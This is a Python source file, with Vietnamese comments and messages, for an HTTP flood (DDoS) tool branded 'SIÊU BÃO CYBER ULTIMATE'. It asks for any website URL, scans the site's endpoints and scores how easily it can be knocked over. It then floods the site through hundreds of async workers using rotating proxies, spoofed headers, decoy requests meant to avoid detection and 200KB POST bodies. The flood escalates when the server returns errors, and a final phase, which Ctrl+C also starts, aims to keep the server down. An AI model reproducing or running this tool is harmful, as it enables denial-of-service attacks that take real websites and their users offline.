#!/usr/bin/env python3

# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import time
import urllib.parse
import random
import hashlib
import socket
from datetime import datetime
import psutil
from rich.console import Console
from rich.table import Table
from rich.progress import track

# Khởi tạo giao diện rich
console = Console()

# Hàm hiển thị banner với rich
def hien_thi_banner():
    console.print("""
[red]QUANG BẢO - SIÊU BÃO CYBER ULTIMATE[/red]
[bold yellow]Tấn công DDoS - Ẩn thân, siêu mạnh, không thể phát hiện![/bold yellow]
[cyan]Phiên bản siêu mạnh VIP Pro với Proxy & Anti-Detection & Error Code Attack - Bản quyền Quang Bảo[/cyan]
""")

# Danh sách User-Agent mở rộng
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
]

# Danh sách header ngẫu nhiên
RANDOM_HEADERS = {
    "Accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*",
    ],
    "Accept-Language": ["en-US,en;q=0.5", "vi-VN,vi;q=0.9,en-US;q=0.8"],
    "Referer": ["https://www.google.com/", "https://www.bing.com/", ""],
    "Cache-Control": ["no-cache", "max-age=0"],
}

# Danh sách proxy mặc định
PROXIES = [
    "http://103.221.254.102:49621",
    "http://103.216.232.33:8080",
    "http://103.194.233.146:8080",
]

# Hàm đọc proxy từ file
def load_proxies(file_path="proxies.txt"):
    global PROXIES
    try:
        with open(file_path, 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        console.print(f"[green]Đã tải {len(PROXIES)} proxy từ {file_path}[/green]")
    except FileNotFoundError:
        console.print("[yellow]Không tìm thấy file proxies.txt, sử dụng danh sách proxy mặc định[/yellow]")
    return PROXIES

# Hàm kiểm tra proxy
async def check_proxy(session, proxy):
    try:
        async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as response:
            if response.status == 200:
                return True
        return False
    except Exception:
        return False

# Dữ liệu POST thông thường
POST_DATA = {"key": random.randint(1, 1000), "value": random.random()}

# Dữ liệu POST siêu nặng cho tấn công mã lỗi
SUPER_HEAVY_POST_DATA = {
    "data": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=200000)),  # 200KB
    "key": random.randint(1, 10000),
    "value": random.random(),
    "extra_params": {f"param_{i}": random.randint(1, 1000) for i in range(200)}  # 200 tham số
}

# Biến đếm toàn cục
success_count = 0
error_count = 0
response_times = []
running = True
final_attack = False
congestion_detected = False
down_detected = False
status_503_attack = False
weakness_attack = False
error_code_attack = False
dynamic_threads = 300
valid_proxies = []
error_code_counts = {code: 0 for code in [500, 501, 502, 503, 504, 505, 400, 401, 403, 404, 408]}

# Hàm tạo header ngẫu nhiên
def generate_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(RANDOM_HEADERS["Accept"]),
        "Accept-Language": random.choice(RANDOM_HEADERS["Accept-Language"]),
        "Referer": random.choice(RANDOM_HEADERS["Referer"]),
        "Cache-Control": random.choice(RANDOM_HEADERS["Cache-Control"]),
    }

# Hàm kiểm tra và chuẩn hóa URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

# Hàm lấy địa chỉ IP từ domain
def get_ip_address(url):
    try:
        parsed_url = urllib.parse.urlparse(url)
        domain = parsed_url.netloc
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror as e:
        console.print(f"[red]Không thể lấy IP từ {domain}: {e}[/red]")
        return None

# Hàm kiểm tra tài nguyên hệ thống
def check_system_resources():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    if cpu_usage > 90 or memory_usage > 90:
        console.print(f"[red]CẢNH BÁO: Tài nguyên hệ thống cao (CPU: {cpu_usage}%, Memory: {memory_usage}%). Giảm tải![/red]")
        return False
    return True

# Hàm điều chỉnh số luồng động
def adjust_threads(current_response_time, error_code_detected=False):
    global dynamic_threads
    if error_code_detected or current_response_time > 2000:
        dynamic_threads = min(dynamic_threads + 100, 600)  # Tăng mạnh luồng khi phát hiện mã lỗi
        console.print(f"[yellow]Tăng luồng lên {dynamic_threads} do phát hiện mã lỗi hoặc phản hồi chậm![/yellow]")
    elif current_response_time < 500:
        dynamic_threads = max(dynamic_threads - 50, 100)
        console.print(f"[yellow]Giảm luồng xuống {dynamic_threads} để tối ưu tài nguyên![/yellow]")
    return dynamic_threads

# Hàm quét endpoint
async def scan_endpoints(session, base_url):
    common_endpoints = ["/api", "/api/v1", "/admin", "/wp-admin", "/login", "/search", "/home", "/about"]
    endpoints = [base_url]
    decoy_endpoints = ["/home", "/about"]
    for endpoint in common_endpoints:
        target = f"{base_url}{endpoint}"
        try:
            async with session.head(target, timeout=5, headers=generate_random_headers(), allow_redirects=True) as response:
                if response.status in [200, 401, 403]:
                    endpoints.append(target)
                    console.print(f"[green]Phát hiện endpoint: {target} (Status: {response.status})[/green]")
        except:
            continue
    return endpoints, decoy_endpoints

# Hàm gửi yêu cầu ngụy trang
async def send_decoy_request(session, url, decoy_endpoints):
    try:
        target_url = random.choice(decoy_endpoints)
        headers = generate_random_headers()
        async with session.get(target_url, timeout=5, headers=headers, allow_redirects=True) as response:
            await response.text()
        console.print(f"[cyan]Gửi yêu cầu ngụy trang đến {target_url}[/cyan]")
    except:
        pass

# Hàm kiểm tra tính dễ bị tấn công
async def analyze_vulnerability(session, url):
    try:
        start_time = time.perf_counter()
        async with session.head(url, timeout=10, headers=generate_random_headers(), allow_redirects=True) as response:
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            ip_address = get_ip_address(url)
            headers = response.headers
            content_length = int(headers.get('Content-Length', 0))

            vulnerability_score = 0
            weaknesses = []
            console.print(f"\n[bold cyan]Phân tích tính dễ bị tấn công của {url}[/bold cyan]")
            console.print(f"[cyan]Địa chỉ IP: {ip_address}[/cyan]")
            console.print(f"[cyan]Trạng thái HTTP: {response.status}[/cyan]")
            console.print(f"[cyan]Thời gian phản hồi: {response_time:.2f}ms[/cyan]")
            console.print(f"[cyan]Kích thước phản hồi: {content_length} bytes[/cyan]")
            console.print(f"[cyan]Server: {headers.get('Server', 'Không xác định')}[/cyan]")

            if response_time > 1000:
                vulnerability_score += 30
                weaknesses.append("Thời gian phản hồi chậm (>1000ms)")
                console.print("[yellow]Cảnh báo: Thời gian phản hồi chậm (>1000ms), dễ bị quá tải![/yellow]")
            elif response_time > 500:
                vulnerability_score += 15
                console.print("[yellow]Thời gian phản hồi trung bình, có thể bị ảnh hưởng.[/yellow]")

            if response.status in [500, 501, 502, 503, 504, 505, 400, 401, 403, 404, 408]:
                vulnerability_score += 30
                weaknesses.append(f"Mã trạng thái {response.status} cho thấy server yếu")
                console.print(f"[yellow]Cảnh báo: Mã trạng thái {response.status} cho thấy server có thể đang yếu![/yellow]")
            elif response.status != 200:
                vulnerability_score += 20
                console.print("[yellow]Mã trạng thái bất thường, server có thể không ổn định.[/yellow]")

            server = headers.get('Server', '').lower()
            if 'apache' in server or 'nginx' in server:
                vulnerability_score += 10
                weaknesses.append(f"Server phổ biến ({server})")
                console.print(f"[yellow]Server phổ biến ({server}), có thể dễ bị tấn công nếu không được cấu hình tốt.[/yellow]")
            if 'cloudflare' not in headers.get('Server', '').lower():
                vulnerability_score += 10
                weaknesses.append("Không có bảo vệ Cloudflare")
                console.print("[yellow]Không phát hiện Cloudflare, website có thể thiếu bảo vệ DDoS.[/yellow]")

            if content_length > 100000:
                vulnerability_score += 20
                weaknesses.append("Kích thước phản hồi lớn (>100KB)")
                console.print("[yellow]Kích thước phản hồi lớn, dễ bị cạn kiệt tài nguyên.[/yellow]")

            console.print(f"\n[bold green]Điểm dễ bị tấn công: {vulnerability_score}/100[/bold green]")
            if weaknesses:
                console.print(f"[bold green]Điểm yếu được phát hiện: {', '.join(weaknesses)}[/bold green]")
            else:
                console.print("[bold green]Không phát hiện điểm yếu rõ ràng.[/bold green]")

            if vulnerability_score >= 70:
                console.print("[bold red]KẾT LUẬN: Website RẤT DỄ bị tấn công DDoS![/bold red]")
            elif vulnerability_score >= 40:
                console.print("[bold yellow]KẾT LUẬN: Website CÓ KHẢ NĂNG bị tấn công DDoS![/bold yellow]")
            else:
                console.print("[bold green]KẾT LUẬN: Website tương đối KHÓ bị tấn công DDoS.[/bold green]")

            return vulnerability_score >= 40, weaknesses
    except Exception as e:
        console.print(f"[red]Lỗi phân tích website: {e}[/red]")
        return False, []

# Hàm gửi yêu cầu không đồng bộ
async def send_request(session, url, request_count, max_retries=5, base_delay=0.01, weaknesses=[]):
    global success_count, error_count, response_times, running, final_attack, congestion_detected, down_detected, status_503_attack, weakness_attack, error_code_attack, valid_proxies, error_code_counts
    methods = ["GET", "POST", "HEAD", "OPTIONS"]
    endpoints, decoy_endpoints = await scan_endpoints(session, url) if weaknesses else ([url], ["/home", "/about"])
    ERROR_CODES = [500, 501, 502, 503, 504, 505, 400, 401, 403, 404, 408]

    for i in track(range(request_count), description="[green]Đang tấn công...[/green]"):
        if not running and not final_attack:
            return
        if not check_system_resources():
            console.print("[red]Dừng yêu cầu do tài nguyên hệ thống quá tải![/red]")
            return
        # Gửi yêu cầu ngụy trang ngẫu nhiên (10% cơ hội)
        if random.random() < 0.1:
            await send_decoy_request(session, url, decoy_endpoints)

        retries = 0
        while retries < max_retries and (running or final_attack):
            try:
                method = random.choice(methods)
                headers = generate_random_headers()
                proxy = random.choice(valid_proxies) if valid_proxies else None
                delay = (random.uniform(0.0001, 0.0005) if (status_503_attack or weakness_attack or error_code_attack) else
                         random.uniform(base_delay, base_delay * 3))
                await asyncio.sleep(delay)
                target_url = random.choice(endpoints)
                post_data = (SUPER_HEAVY_POST_DATA if (status_503_attack or weakness_attack or error_code_attack) and method == "POST" else
                             POST_DATA)
                start_time = time.perf_counter()
                async with session.request(method, target_url, data=post_data if method == "POST" else None,
                                        timeout=10, headers=headers, allow_redirects=True, proxy=proxy) as response:
                    await response.text()
                response_time = (time.perf_counter() - start_time) * 1000
                success_count += 1
                response_times.append(response_time)

                adjust_threads(response_time, error_code_detected=response.status in ERROR_CODES)

                if response_time > 2000 and not congestion_detected:
                    console.print(f"\n[yellow]CẢNH BÁO: Website có dấu hiệu bị nghẽn! Thời gian phản hồi: {response_time:.2f}ms[/yellow]")
                    congestion_detected = True

                if response.status in ERROR_CODES and not error_code_attack:
                    error_code_counts[response.status] += 1
                    console.print(f"\n[red]CẢNH BÁO: Phát hiện mã {response.status}! Kích hoạt chế độ tấn công siêu mạnh![/red]")
                    error_code_attack = True

                if weaknesses and not weakness_attack:
                    console.print(f"\n[red]Kích hoạt chế độ tấn công điểm yếu: {', '.join(weaknesses)}[/red]")
                    weakness_attack = True

                if response.status in [503, 504] or response_time == 0:
                    if not down_detected:
                        console.print(f"\n[red]CẢNH BÁO: Website có thể đã sập! Trạng thái: {response.status}, Thời gian: {response_time:.2f}ms[/red]")
                        down_detected = True

                if response.status == 429:  # Too Many Requests
                    console.print(f"\n[yellow]CẢNH BÁO: Server trả về 429, tạm dừng và thử proxy khác![/yellow]")
                    await asyncio.sleep(random.uniform(5, 10))
                    if valid_proxies:
                        valid_proxies.remove(proxy) if proxy in valid_proxies else None
                        proxy = random.choice(valid_proxies) if valid_proxies else None

                console.print(f"[cyan]Tấn Công {method} #{i+1} ({target_url}): Status {response.status}, Time: {response_time:.2f}ms[/cyan]")
                break
            except (aiohttp.ClientConnectionError, asyncio.TimeoutError) as e:
                error_count += 1
                retries += 1
                response_times.append(0)
                if not down_detected:
                    console.print(f"\n[red]CẢNH BÁO: Website có thể đã sập! Lỗi: {str(e)}[/red]")
                    down_detected = True
                console.print(f"[yellow]Lỗi kết nối #{i+1} (Thử lại {retries}/{max_retries}): {str(e)}[/yellow]")
                if retries < max_retries:
                    await asyncio.sleep(min(2 ** retries, 10))
                else:
                    console.print(f"[red]Bỏ qua yêu cầu #{i+1} sau {max_retries} lần thử[/red]")
                    if valid_proxies and proxy:
                        valid_proxies.remove(proxy) if proxy in valid_proxies else None
            except Exception as e:
                error_count += 1
                console.print(f"[red]Lỗi không xác định #{i+1}: {str(e)}[/red]")
                break

# Hàm gửi đợt tấn công cuối cùng
async def final_attack_phase(session, url, thread_count, weaknesses=[]):
    global final_attack, status_503_attack, weakness_attack, error_code_attack
    console.print("\n[bold red]BẬT GIAI ĐOẠN CUỐI - TẤN CÔNG SIÊU MẠNH ĐỂ GIỮ SERVER SẬP![/bold red]")
    final_attack = True
    tasks = [send_request(session, url, 20000 if (status_503_attack or weakness_attack or error_code_attack) else 5000, weaknesses=weaknesses)
             for _ in range(thread_count)]
    await asyncio.gather(*tasks)
    console.print("[bold green]Hoàn tất giai đoạn cuối, server có thể đã sập hoàn toàn![/bold green]")

# Hàm tạo hash cho khóa
def generate_key_hash(key):
    return hashlib.sha256(key.encode()).hexdigest()

# Hàm xác thực khóa
def validate_key():
    VALID_KEY = "quangbao07"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        user_key = input("\nNhập khóa truy cập: ")
        if generate_key_hash(user_key) == VALID_KEY_HASH:
            console.print("\n[bold green]🎉 XÁC THỰC THÀNH CÔNG! CHÀO MỪNG BẠN ĐẾN HỆ THỐNG! 🎉[/bold green]")
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            console.print(f"[cyan]📊 THÔNG TIN TRUY CẬP: Thời gian: {current_time}, Trạng thái: Đã xác thực[/cyan]")
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            console.print(f"[red]❌ KHÓA KHÔNG HỢP LỆ! Còn {remaining} lần thử[/red]")
            time.sleep(1)

    console.print("\n[red]🚫 TRUY CẬP BỊ TỪ CHỐI - HỆ THỐNG KHÓA 🚫[/red]")
    return False

# Hàm hiển thị báo cáo
def display_report(total_requests, total_time):
    global success_count, error_count, response_times, congestion_detected, down_detected, status_503_attack, weakness_attack, error_code_attack, error_code_counts
    table = Table(title="[bold cyan]BÁO CÁO SIÊU BÃO CYBER ULTIMATE[/bold cyan]")
    table.add_column("Thông số", style="cyan")
    table.add_column("Giá trị", style="green")

    table.add_row("Tổng số yêu cầu", str(total_requests))
    table.add_row("Yêu cầu thành công", str(success_count))
    table.add_row("Yêu cầu thất bại", str(error_count))
    table.add_row("Thời gian thực hiện", f"{total_time:.2f} giây")
    table.add_row("Thời gian phản hồi trung bình", f"{sum(response_times) / len(response_times):.2f} ms" if response_times else "0 ms")
    table.add_row("Thời gian phản hồi tối đa", f"{max(response_times):.2f} ms" if response_times else "0 ms")
    table.add_row("Thời gian phản hồi tối thiểu", f"{min(response_times):.2f} ms" if response_times else "0 ms")
    for code, count in error_code_counts.items():
        if count > 0:
            table.add_row(f"Số lần mã lỗi {code}", str(count))

    console.print(table)
    if congestion_detected:
        console.print("[yellow]KẾT LUẬN: Website đã bị nghẽn trong quá trình tấn công![/yellow]")
    if down_detected:
        console.print("[red]KẾT LUẬN: Website đã sập trong quá trình tấn công![/red]")
    if status_503_attack:
        console.print("[red]KẾT LUẬN: Chế độ tấn công mạnh khi phát hiện mã 503 đã được kích hoạt![/red]")
    if weakness_attack:
        console.print("[red]KẾT LUẬN: Chế độ tấn công điểm yếu đã được kích hoạt![/red]")
    if error_code_attack:
        console.print("[red]KẾT LUẬN: Chế độ tấn công siêu mạnh vào mã lỗi HTTP đã được kích hoạt![/red]")
    console.print("[bold cyan]QUANG BẢO - Bảo mật của bạn đã được thử thách![/bold cyan]")

# Hàm kiểm tra và lọc proxy
async def validate_proxies():
    global valid_proxies
    valid_proxies = []
    async with aiohttp.ClientSession() as session:
        for proxy in PROXIES:
            if await check_proxy(session, proxy):
                valid_proxies.append(proxy)
                console.print(f"[green]Proxy hợp lệ: {proxy}[/green]")
            else:
                console.print(f"[red]Proxy không hoạt động: {proxy}[/red]")
    if not valid_proxies:
        console.print("[yellow]Không có proxy hợp lệ, tiếp tục không dùng proxy.[/yellow]")

# Hàm chính
async def main():
    global running, congestion_detected, down_detected, status_503_attack, weakness_attack, error_code_attack, dynamic_threads, valid_proxies
    try:
        hien_thi_banner()
        if not validate_key():
            console.print("\n[red]Hệ thống đã đóng do xác thực thất bại.[/red]")
            return

        load_proxies("proxies.txt")
        console.print("[cyan]Đang kiểm tra proxy...[/cyan]")
        await validate_proxies()

        input_url = input("NHẬP URL WEBSITE BẠN MUỐN TẤN CÔNG: ")
        validated_url = validate_url(input_url)
        console.print(f"[cyan]Bạn xác nhận phân tích và tấn công trên {validated_url} không? (y/n): [/cyan]")
        confirm = input().lower()
        if confirm != 'y':
            console.print("[red]Hủy kiểm tra![/red]")
            return

        async with aiohttp.ClientSession() as session:
            is_vulnerable, weaknesses = await analyze_vulnerability(session, validated_url)
            if not is_vulnerable:
                console.print("[yellow]Website có vẻ khó bị tấn công. Tiếp tục tấn công?[/yellow]")
                if input("Xác nhận (y/n): ").lower() != 'y':
                    return

        NUM_THREADS = dynamic_threads
        REQUESTS_PER_THREAD = 10000 if (status_503_attack or weakness_attack or error_code_attack) else 5000
        FINAL_THREADS = 100
        TOTAL_REQUESTS = NUM_THREADS * REQUESTS_PER_THREAD + FINAL_THREADS * (20000 if (status_503_attack or weakness_attack or error_code_attack) else 5000)
        console.print(f"[bold green]KHỞI ĐỘNG SIÊU BÃO CYBER ULTIMATE - TẤN CÔNG {TOTAL_REQUESTS} YÊU CẦU VỚI {NUM_THREADS} LUỒNG ĐẾN {validated_url}...[/bold green]")
        start_time = time.time()

        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, validated_url, REQUESTS_PER_THREAD, weaknesses=weaknesses) for _ in range(NUM_THREADS)]
            await asyncio.gather(*tasks)

        if running:
            await final_attack_phase(session, validated_url, FINAL_THREADS, weaknesses)

        end_time = time.time()
        total_time = end_time - start_time
        display_report(TOTAL_REQUESTS, total_time)

    except KeyboardInterrupt:
        console.print("\n[red]⚠️ Người dùng yêu cầu dừng, kích hoạt giai đoạn tấn công cuối...[/red]")
        running = False
        await asyncio.sleep(1)
        async with aiohttp.ClientSession() as session:
            await final_attack_phase(session, validated_url, FINAL_THREADS, weaknesses)
        end_time = time.time()
        total_time = end_time - start_time
        display_report(TOTAL_REQUESTS, total_time)
    except Exception as e:
        console.print(f"\n[red]❌ Lỗi hệ thống: {e}[/red]")

if __name__ == "__main__":
    asyncio.run(main())
